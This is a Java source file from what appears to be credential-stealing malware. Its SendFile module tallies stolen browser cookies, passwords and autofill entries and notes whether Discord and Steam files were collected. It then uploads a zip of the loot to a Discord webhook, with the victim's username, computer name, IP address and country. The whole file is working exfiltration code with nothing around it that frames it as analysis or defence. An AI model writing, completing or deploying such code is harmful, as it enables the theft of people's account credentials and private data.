package _256.node.nodes.file;

import java.awt.Color;
import java.io.File;

import _256.node.Category;
import _256.node.Node;
import _256.utils.Util;
import club.minnced.discord.webhook.WebhookClient;
import club.minnced.discord.webhook.send.WebhookEmbed;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedAuthor;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedField;
import club.minnced.discord.webhook.send.WebhookEmbed.EmbedFooter;
import club.minnced.discord.webhook.send.WebhookEmbedBuilder;
import club.minnced.discord.webhook.send.WebhookMessageBuilder;

public class SendFile extends Node {

	public SendFile() {
		super(Category.FILE);
	}

	public static String WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK";
    public static WebhookClient client = WebhookClient.withUrl(WEBHOOK_URL);
	public static String steam = "";
	public static String discord = "";

	@Override
	public void createNode() throws Exception {
		if (getFolder().exists()) {
			Util.lineCounterCookies();
			Util.lineCounterPasswords();
			Util.lineCounterAutoFills();
			if(mergePath(getFolder(), "Discord").exists()) {
				discord = "discord files <:emoji:> ";
			}
			if(mergePath(getFolder(), "Steam").exists()) {
				steam = "steam files <:emoji:> ";
			}
			File zip = new File(System.getProperty("user.home") + "\\" + System.getenv("COMPUTERNAME") + ".zip");
			File check = new File(System.getProperty("user.home") + "\\AppData\\Local\\Temp\\" + System.getenv("COMPUTERNAME"));
			if (!check.exists()) {
				WebhookMessageBuilder builder = new WebhookMessageBuilder();
				WebhookEmbed embed = new WebhookEmbedBuilder()
				.setAuthor(new EmbedAuthor(System.getProperty("user.name") + " (" + System.getenv("COMPUTERNAME") + ")", "", ""))
				.addField(new EmbedField(true, "Cookies", "<:emoji:> " + Util.totalLineCountCookies))
				.addField(new EmbedField(true, "AutoFills", "<:emoji:> " + Util.totalLineCountAutoFills))
				.addField(new EmbedField(true, "Passwords", "<:emoji:> " + Util.totalLineCountPasswords))
				.addField(new EmbedField(true, "IP Adress", Util.getIP()))
				.addField(new EmbedField(true, "Country", Util.getCountry() + " " + ":flag_" + Util.getCity().toLowerCase() + ":"))
				.setThumbnailUrl("YOUR_IMAGE_URL")
				.setFooter(new EmbedFooter("Application run time: " + Util.getTime() + " - " + Util.convertTurkeyTime(), ""))
				.setColor(Color.cyan.hashCode())
				.setDescription(steam + discord)
				.build();
				builder.addFile(zip);
				client.send(embed);
				client.send(builder.build());
				check.mkdir();
			}
		}
	}
}
